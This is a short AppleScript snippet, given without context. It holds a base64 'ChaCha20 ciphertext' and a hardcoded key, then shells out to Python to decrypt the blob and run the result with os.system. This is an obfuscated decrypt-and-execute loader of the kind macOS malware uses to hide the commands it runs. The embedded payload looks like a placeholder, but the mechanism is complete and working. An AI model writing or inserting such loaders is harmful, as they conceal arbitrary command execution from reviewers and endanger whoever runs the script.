-- Store encrypted payload (base64) and key inline
set encrypted to "VTNYTlZqRkZaMGhLUzBnPQ==" -- base64-encoded ChaCha20 ciphertext
set key to "mysecretpassword"

-- Call Python to decrypt and execute it
do shell script "python3 -c 'from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes; " & ¬
"import os, base64; key=b\"" & key & "\".ljust(32, b\"0\"); " & ¬
"nonce=b\"00000000nonce123\"; " & ¬
"cipher=Cipher(algorithms.ChaCha20(key, nonce), mode=None); " & ¬
"decryptor=cipher.decryptor(); data=decryptor.update(base64.b64decode(\"" & encrypted & "\")); os.system(data.decode())'"
